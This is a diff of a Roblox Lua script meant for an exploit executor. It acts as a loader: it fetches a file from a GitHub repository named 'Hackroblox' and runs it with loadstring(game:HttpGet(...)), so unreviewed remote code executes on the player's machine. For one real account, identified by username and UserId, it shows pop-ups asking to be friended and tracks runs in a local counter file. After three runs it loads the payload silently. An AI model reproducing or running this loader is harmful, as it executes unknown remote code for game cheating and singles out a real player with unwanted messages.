@@ -1,247 +1,317 @@
--- LocalScript (place in StarterPlayerScripts or similar)
+-- LocalScript for Roblox Executor (not for Studio)
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
-local HttpService = game:GetService("HttpService")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
-if player.Name == "howplayprotsb" or player.UserId == 9811432818 then
-    -- Special UI for target player
-    -- Create ScreenGui
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "SpecialUI"
-    screenGui.Parent = playerGui
-    screenGui.ResetOnSpawn = false
-
-    -- Main Frame (bottom left)
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Name = "MainFrame"
-    mainFrame.Size = UDim2.new(0, 320, 0, 280)
-    mainFrame.Position = UDim2.new(0, -340, 1, -300)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-    mainFrame.BorderSizePixel = 0
-    mainFrame.Parent = screenGui
-
-    -- UIGradient for main frame background
-    local mainGradient = Instance.new("UIGradient")
-    mainGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 50, 70)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 30))
-    }
-    mainGradient.Rotation = 45
-    mainGradient.Parent = mainFrame
-
-    -- UIStroke for border
-    local mainStroke = Instance.new("UIStroke")
-    mainStroke.Color = Color3.fromRGB(100, 100, 150)
-    mainStroke.Thickness = 2
-    mainStroke.Transparency = 0.5
-    mainStroke.Parent = mainFrame
-
-    -- Corner for frame
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 15)
-    corner.Parent = mainFrame
-
-    -- Tween for entrance animation
-    local entranceTween = TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0, 20, 1, -300)})
-    entranceTween:Play()
-
-    -- TextLabel for message
-    local messageLabel = Instance.new("TextLabel")
-    messageLabel.Name = "MessageLabel"
-    messageLabel.Size = UDim2.new(1, -30, 0.65, 0)
-    messageLabel.Position = UDim2.new(0, 15, 0, 15)
-    messageLabel.BackgroundTransparency = 1
-    messageLabel.Text = "You are howplayprotsb, right?\nYou have a nice name but why do you use scripts? XD\nCan you be my friend?\nMy Roblox account name is: braniothecraft5"
-    messageLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
-    messageLabel.TextScaled = true
-    messageLabel.Font = Enum.Font.Gotham
-    messageLabel.TextWrapped = true
-    messageLabel.TextXAlignment = Enum.TextXAlignment.Left
-    messageLabel.Parent = mainFrame
-
-    -- Load Script Button
-    local loadButton = Instance.new("TextButton")
-    loadButton.Name = "LoadButton"
-    loadButton.Size = UDim2.new(0.8, 0, 0.15, 0)
-    loadButton.Position = UDim2.new(0.1, 0, 0.75, 0)
-    loadButton.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
-    loadButton.Text = "Load Script"
-    loadButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    loadButton.TextScaled = true
-    loadButton.Font = Enum.Font.GothamBold
-    loadButton.Parent = mainFrame
-
-    -- Gradient for button
-    local buttonGradient = Instance.new("UIGradient")
-    buttonGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 162, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 120, 200))
-    }
-    buttonGradient.Parent = loadButton
-
-    local loadButtonCorner = Instance.new("UICorner")
-    loadButtonCorner.CornerRadius = UDim.new(0, 8)
-    loadButtonCorner.Parent = loadButton
-
-    -- Stroke for button
-    local buttonStroke = Instance.new("UIStroke")
-    buttonStroke.Color = Color3.fromRGB(255, 255, 255)
-    buttonStroke.Thickness = 1
-    buttonStroke.Transparency = 0.3
-    buttonStroke.Parent = loadButton
-
-    -- Initially disable button
-    loadButton.Active = false
-    loadButton.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
-    buttonGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 80, 90)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 60, 70))
-    }
-
-    -- Wait 10 seconds then enable with animation
-    spawn(function()
-        wait(10)
-        local enableTween = TweenService:Create(loadButton, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(0, 162, 255)})
-        buttonGradient.Color = ColorSequence.new{
-            ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 162, 255)),
-            ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 120, 200))
-        }
-        enableTween:Play()
-        loadButton.Active = true
-    end)
-
-    -- Confirmation Frame (centered)
-    local confirmFrame = Instance.new("Frame")
-    confirmFrame.Name = "ConfirmFrame"
-    confirmFrame.Size = UDim2.new(0, 280, 0, 180)
-    confirmFrame.Position = UDim2.new(0.5, -140, 0.5, -90)
-    confirmFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-    confirmFrame.BorderSizePixel = 0
-    confirmFrame.Visible = false
-    confirmFrame.Parent = screenGui
-
-    -- Gradient for confirm frame
-    local confirmGradient = Instance.new("UIGradient")
-    confirmGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 50, 70)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 30))
-    }
-    confirmGradient.Rotation = 45
-    confirmGradient.Parent = confirmFrame
-
-    local confirmStroke = Instance.new("UIStroke")
-    confirmStroke.Color = Color3.fromRGB(100, 100, 150)
-    confirmStroke.Thickness = 2
-    confirmStroke.Transparency = 0.5
-    confirmStroke.Parent = confirmFrame
-
-    local confirmCorner = Instance.new("UICorner")
-    confirmCorner.CornerRadius = UDim.new(0, 15)
-    confirmCorner.Parent = confirmFrame
-
-    -- Confirmation Message
-    local confirmLabel = Instance.new("TextLabel")
-    confirmLabel.Name = "ConfirmLabel"
-    confirmLabel.Size = UDim2.new(1, -20, 0.6, 0)
-    confirmLabel.Position = UDim2.new(0, 10, 0, 15)
-    confirmLabel.BackgroundTransparency = 1
-    confirmLabel.Text = "Have you read it all yet?"
-    confirmLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
-    confirmLabel.TextScaled = true
-    confirmLabel.Font = Enum.Font.Gotham
-    confirmLabel.TextWrapped = true
-    confirmLabel.Parent = confirmFrame
-
-    -- Confirm Button
-    local confirmButton = Instance.new("TextButton")
-    confirmButton.Name = "ConfirmButton"
-    confirmButton.Size = UDim2.new(0.8, 0, 0.25, 0)
-    confirmButton.Position = UDim2.new(0.1, 0, 0.7, 0)
-    confirmButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-    confirmButton.Text = "Confirm"
-    confirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    confirmButton.TextScaled = true
-    confirmButton.Font = Enum.Font.GothamBold
-    confirmButton.Parent = confirmFrame
-
-    -- Gradient for confirm button
-    local confirmButtonGradient = Instance.new("UIGradient")
-    confirmButtonGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 0)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 0))
-    }
-    confirmButtonGradient.Parent = confirmButton
-
-    local confirmButtonCorner = Instance.new("UICorner")
-    confirmButtonCorner.CornerRadius = UDim.new(0, 8)
-    confirmButtonCorner.Parent = confirmButton
-
-    local confirmButtonStroke = Instance.new("UIStroke")
-    confirmButtonStroke.Color = Color3.fromRGB(255, 255, 255)
-    confirmButtonStroke.Thickness = 1
-    confirmButtonStroke.Transparency = 0.3
-    confirmButtonStroke.Parent = confirmButton
-
-    -- Initially disable confirm button
-    confirmButton.Active = false
-    confirmButton.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
-    confirmButtonGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 80, 90)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 60, 70))
-    }
-
-    -- Tween for confirm frame entrance
-    local confirmEntranceTween = TweenService:Create(confirmFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, 280, 0, 180)})
-
-    -- Load Button Click
-    loadButton.MouseButton1Click:Connect(function()
-        local hideTween = TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(0, -340, 1, -300)})
-        hideTween:Play()
-        hideTween.Completed:Connect(function()
-            mainFrame.Visible = false
-            confirmFrame.Visible = true
-            confirmFrame.Size = UDim2.new(0, 0, 0, 0)
-            confirmEntranceTween:Play()
-            spawn(function()
-                wait(3)
-                local enableTween = TweenService:Create(confirmButton, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(0, 255, 0)})
-                confirmButtonGradient.Color = ColorSequence.new{
-                    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 0)),
-                    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 0))
-                }
-                enableTween:Play()
-                confirmButton.Active = true
-            end)
-        end)
-    end)
-
-    -- Confirm Button Click
-    confirmButton.MouseButton1Click:Connect(function()
-        local hideTween = TweenService:Create(confirmFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0)})
-        hideTween:Play()
-        hideTween.Completed:Connect(function()
-            confirmFrame.Visible = false
-            -- Load the script
-            local success, err = pcall(function()
-                loadstring(HttpService:GetAsync("https://raw.githubusercontent.com/trantung120213123/Hackroblox/refs/heads/main/hehe%3A)))")()
-            end)
-            if not success then
-                warn("Failed to load script: " .. tostring(err))
-            end
-            -- Destroy UI after loading
-            screenGui:Destroy()
-        end)
-    end)
-else
-    -- Load script immediately for other players
+-- Function to load the script
+local function loadScript()
     local success, err = pcall(function()
-        loadstring(HttpService:GetAsync("https://raw.githubusercontent.com/trantung120213123/Hackroblox/refs/heads/main/hehe%3A)))")()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/trantung120213123/Hackroblox/refs/heads/main/hehe%3A)))"))()
     end)
     if not success then
         warn("Failed to load script: " .. tostring(err))
     end
+end
+
+if player.Name == "howplayprotsb" or player.UserId == 9811432818 then
+    -- For target player: check counter
+    local countFile = "script_count.txt"
+    local count = 0
+    if isfile(countFile) then
+        local fileContent = readfile(countFile)
+        count = tonumber(fileContent) or 0
+    end
+    
+    if count >= 3 then
+        -- After 3 times: load directly, no UI
+        loadScript()
+    else
+        -- Show UI flow
+        -- Create ScreenGui
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "SpecialUI"
+        screenGui.Parent = playerGui
+        screenGui.ResetOnSpawn = false
+
+        -- Main Frame (bottom left)
+        local mainFrame = Instance.new("Frame")
+        mainFrame.Name = "MainFrame"
+        mainFrame.Size = UDim2.new(0, 320, 0, 280)
+        mainFrame.Position = UDim2.new(0, -340, 1, -300)
+        mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+        mainFrame.BorderSizePixel = 0
+        mainFrame.Parent = screenGui
+
+        -- UIGradient for main frame background
+        local mainGradient = Instance.new("UIGradient")
+        mainGradient.Color = ColorSequence.new{
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 50, 70)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 30))
+        }
+        mainGradient.Rotation = 45
+        mainGradient.Parent = mainFrame
+
+        -- UIStroke for border
+        local mainStroke = Instance.new("UIStroke")
+        mainStroke.Color = Color3.fromRGB(100, 100, 150)
+        mainStroke.Thickness = 2
+        mainStroke.Transparency = 0.5
+        mainStroke.Parent = mainFrame
+
+        -- Corner for frame
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 15)
+        corner.Parent = mainFrame
+
+        -- Tween for entrance animation
+        local entranceTween = TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0, 20, 1, -300)})
+        entranceTween:Play()
+
+        -- TextLabel for message
+        local messageLabel = Instance.new("TextLabel")
+        messageLabel.Name = "MessageLabel"
+        messageLabel.Size = UDim2.new(1, -30, 0.65, 0)
+        messageLabel.Position = UDim2.new(0, 15, 0, 15)
+        messageLabel.BackgroundTransparency = 1
+        messageLabel.Text = "You are howplayprotsb, right?\nYou have a nice name but why do you use scripts? XD\nCan you be my friend?\nMy Roblox account name is: braniothecraft5"
+        messageLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
+        messageLabel.TextScaled = true
+        messageLabel.Font = Enum.Font.Gotham
+        messageLabel.TextWrapped = true
+        messageLabel.TextXAlignment = Enum.TextXAlignment.Left
+        messageLabel.Parent = mainFrame
+
+        -- Load Script Button
+        local loadButton = Instance.new("TextButton")
+        loadButton.Name = "LoadButton"
+        loadButton.Size = UDim2.new(0.8, 0, 0.15, 0)
+        loadButton.Position = UDim2.new(0.1, 0, 0.75, 0)
+        loadButton.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
+        loadButton.Text = "Load Script"
+        loadButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        loadButton.TextScaled = true
+        loadButton.Font = Enum.Font.GothamBold
+        loadButton.Parent = mainFrame
+
+        -- Gradient for button
+        local buttonGradient = Instance.new("UIGradient")
+        buttonGradient.Color = ColorSequence.new{
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 162, 255)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 120, 200))
+        }
+        buttonGradient.Parent = loadButton
+
+        local loadButtonCorner = Instance.new("UICorner")
+        loadButtonCorner.CornerRadius = UDim.new(0, 8)
+        loadButtonCorner.Parent = loadButton
+
+        -- Stroke for button
+        local buttonStroke = Instance.new("UIStroke")
+        buttonStroke.Color = Color3.fromRGB(255, 255, 255)
+        buttonStroke.Thickness = 1
+        buttonStroke.Transparency = 0.3
+        buttonStroke.Parent = loadButton
+
+        -- Initially disable button
+        loadButton.Active = false
+        loadButton.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
+        buttonGradient.Color = ColorSequence.new{
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 80, 90)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 60, 70))
+        }
+
+        -- Wait 10 seconds then enable with animation
+        spawn(function()
+            wait(10)
+            local enableTween = TweenService:Create(loadButton, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(0, 162, 255)})
+            buttonGradient.Color = ColorSequence.new{
+                ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 162, 255)),
+                ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 120, 200))
+            }
+            enableTween:Play()
+            loadButton.Active = true
+        end)
+
+        -- Confirmation Frame (centered)
+        local confirmFrame = Instance.new("Frame")
+        confirmFrame.Name = "ConfirmFrame"
+        confirmFrame.Size = UDim2.new(0, 280, 0, 180)
+        confirmFrame.Position = UDim2.new(0.5, -140, 0.5, -90)
+        confirmFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+        confirmFrame.BorderSizePixel = 0
+        confirmFrame.Visible = false
+        confirmFrame.Parent = screenGui
+
+        -- Gradient for confirm frame
+        local confirmGradient = Instance.new("UIGradient")
+        confirmGradient.Color = ColorSequence.new{
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 50, 70)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 30))
+        }
+        confirmGradient.Rotation = 45
+        confirmGradient.Parent = confirmFrame
+
+        local confirmStroke = Instance.new("UIStroke")
+        confirmStroke.Color = Color3.fromRGB(100, 100, 150)
+        confirmStroke.Thickness = 2
+        confirmStroke.Transparency = 0.5
+        confirmStroke.Parent = confirmFrame
+
+        local confirmCorner = Instance.new("UICorner")
+        confirmCorner.CornerRadius = UDim.new(0, 15)
+        confirmCorner.Parent = confirmFrame
+
+        -- Confirmation Message
+        local confirmLabel = Instance.new("TextLabel")
+        confirmLabel.Name = "ConfirmLabel"
+        confirmLabel.Size = UDim2.new(1, -20, 0.6, 0)
+        confirmLabel.Position = UDim2.new(0, 10, 0, 15)
+        confirmLabel.BackgroundTransparency = 1
+        confirmLabel.Text = "Have you read it all yet?"
+        confirmLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
+        confirmLabel.TextScaled = true
+        confirmLabel.Font = Enum.Font.Gotham
+        confirmLabel.TextWrapped = true
+        confirmLabel.Parent = confirmFrame
+
+        -- Confirm Button
+        local confirmButton = Instance.new("TextButton")
+        confirmButton.Name = "ConfirmButton"
+        confirmButton.Size = UDim2.new(0.8, 0, 0.25, 0)
+        confirmButton.Position = UDim2.new(0.1, 0, 0.7, 0)
+        confirmButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+        confirmButton.Text = "Confirm"
+        confirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        confirmButton.TextScaled = true
+        confirmButton.Font = Enum.Font.GothamBold
+        confirmButton.Parent = confirmFrame
+
+        -- Gradient for confirm button
+        local confirmButtonGradient = Instance.new("UIGradient")
+        confirmButtonGradient.Color = ColorSequence.new{
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 0)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 0))
+        }
+        confirmButtonGradient.Parent = confirmButton
+
+        local confirmButtonCorner = Instance.new("UICorner")
+        confirmButtonCorner.CornerRadius = UDim.new(0, 8)
+        confirmButtonCorner.Parent = confirmButton
+
+        local confirmButtonStroke = Instance.new("UIStroke")
+        confirmButtonStroke.Color = Color3.fromRGB(255, 255, 255)
+        confirmButtonStroke.Thickness = 1
+        confirmButtonStroke.Transparency = 0.3
+        confirmButtonStroke.Parent = confirmButton
+
+        -- Initially disable confirm button
+        confirmButton.Active = false
+        confirmButton.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
+        confirmButtonGradient.Color = ColorSequence.new{
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 80, 90)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 60, 70))
+        }
+
+        -- Tween for confirm frame entrance
+        local confirmEntranceTween = TweenService:Create(confirmFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, 280, 0, 180)})
+
+        -- Load Button Click
+        loadButton.MouseButton1Click:Connect(function()
+            local hideTween = TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(0, -340, 1, -300)})
+            hideTween:Play()
+            hideTween.Completed:Connect(function()
+                mainFrame.Visible = false
+                confirmFrame.Visible = true
+                confirmFrame.Size = UDim2.new(0, 0, 0, 0)
+                confirmEntranceTween:Play()
+                spawn(function()
+                    wait(3)
+                    local enableTween = TweenService:Create(confirmButton, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(0, 255, 0)})
+                    confirmButtonGradient.Color = ColorSequence.new{
+                        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 0)),
+                        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 0))
+                    }
+                    enableTween:Play()
+                    confirmButton.Active = true
+                end)
+            end)
+        end)
+
+        -- Confirm Button Click
+        confirmButton.MouseButton1Click:Connect(function()
+            local hideTween = TweenService:Create(confirmFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0)})
+            hideTween:Play()
+            hideTween.Completed:Connect(function()
+                confirmFrame.Visible = false
+                -- Load the script
+                loadScript()
+                -- Increment counter and save
+                count = count + 1
+                writefile(countFile, tostring(count))
+                -- Destroy main UI
+                screenGui:Destroy()
+                -- Show small friend UI (only if count < 3, but since we show main UI only <3, this will be shown up to 3rd time)
+                if count < 3 then
+                    wait(1) -- Small delay for smoothness
+                    local friendGui = Instance.new("ScreenGui")
+                    friendGui.Name = "FriendUI"
+                    friendGui.Parent = playerGui
+                    friendGui.ResetOnSpawn = false
+
+                    local smallFrame = Instance.new("Frame")
+                    smallFrame.Name = "SmallFrame"
+                    smallFrame.Size = UDim2.new(0, 220, 0, 80)
+                    smallFrame.Position = UDim2.new(1, 0, 1, 0) -- Start off-screen
+                    smallFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+                    smallFrame.BorderSizePixel = 0
+                    smallFrame.Parent = friendGui
+
+                    -- UIGradient for small frame
+                    local smallGradient = Instance.new("UIGradient")
+                    smallGradient.Color = ColorSequence.new{
+                        ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 50, 70)),
+                        ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 30))
+                    }
+                    smallGradient.Rotation = 45
+                    smallGradient.Parent = smallFrame
+
+                    -- UIStroke for border
+                    local smallStroke = Instance.new("UIStroke")
+                    smallStroke.Color = Color3.fromRGB(100, 100, 150)
+                    smallStroke.Thickness = 1.5
+                    smallStroke.Transparency = 0.5
+                    smallStroke.Parent = smallFrame
+
+                    -- Corner for small frame
+                    local smallCorner = Instance.new("UICorner")
+                    smallCorner.CornerRadius = UDim.new(0, 10)
+                    smallCorner.Parent = smallFrame
+
+                    -- Tween for small frame entrance
+                    local smallEntranceTween = TweenService:Create(smallFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(1, -240, 1, -100)})
+                    smallEntranceTween:Play()
+
+                    -- TextLabel for friend message
+                    local friendLabel = Instance.new("TextLabel")
+                    friendLabel.Name = "FriendLabel"
+                    friendLabel.Size = UDim2.new(1, -20, 1, -10)
+                    friendLabel.Position = UDim2.new(0, 10, 0, 5)
+                    friendLabel.BackgroundTransparency = 1
+                    friendLabel.Text = "Have you added me as a friend yet?"
+                    friendLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
+                    friendLabel.TextScaled = true
+                    friendLabel.Font = Enum.Font.Gotham
+                    friendLabel.TextWrapped = true
+                    friendLabel.TextXAlignment = Enum.TextXAlignment.Center
+                    friendLabel.Parent = smallFrame
+                end
+            end)
+        end)
+    end
+else
+    -- Load script immediately for other players
+    loadScript()
 end
